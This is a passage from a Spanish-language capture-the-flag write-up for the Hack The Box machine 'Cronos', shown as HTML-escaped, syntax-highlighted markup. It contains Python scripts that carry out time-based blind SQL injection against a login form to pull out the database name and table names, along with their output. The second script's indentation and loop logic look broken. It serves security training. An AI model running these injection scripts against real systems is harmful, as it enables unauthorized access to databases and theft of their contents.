+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'0123456789abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'loquesea'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generando el payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Database&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;' or if(substr(database(),&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1)='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c',sleep(3),1)-- -&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Probando con: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fin del payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;El nombre de la base de datos es: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 database_name.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Payload: Fin del payload
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Database: El nombre de la base de datos es: admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el nombre la base de datos datos que es &lt;strong&gt;admin&lt;/strong&gt;, ahora vamos a tratar de obtener las tablas que conforman dicha base y esto lo logramos modificando la consulta, es decir, la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqli&lt;/code&gt; y agregando otro bucle &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;for&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
+#codgin: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Saliendo...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;def_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Variables globales
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://admin.cronos.htb/index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;r'0123456789abcdefghijklmnopqrstuvwxyz'&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'loquesea'&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Generando el payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Table[&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;        
+		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1),&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,1)='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c',sleep(3),1)-- -&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Probando con: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;c&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;cont1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Fin del payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
